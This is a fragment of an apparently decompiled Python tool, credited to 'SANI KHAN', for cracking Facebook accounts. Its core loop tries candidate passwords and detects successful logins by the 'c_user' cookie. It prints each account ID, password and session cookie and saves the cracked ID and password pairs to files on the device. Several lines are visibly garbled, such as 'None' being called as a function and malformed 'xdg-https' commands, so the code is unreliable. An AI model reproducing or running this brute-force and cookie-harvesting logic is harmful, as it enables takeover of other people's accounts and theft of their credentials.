...
def FD():
    ...
    if opt == '1':
        os.system('xdg-https://youtube.com/channel/UCgIh1PSfNWJ-vA25mxglYIA')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/sanikhan570')
        return None
    if None == '3':
        os.system('xdg-https://youtube.com/channel/UCgIh1PSfNWJ-vA25mxglYIA')
        return None
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSANI KHAN
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34mMd Robel Mia 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SANI-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SANI-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(SANI-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SANI-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[SANI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
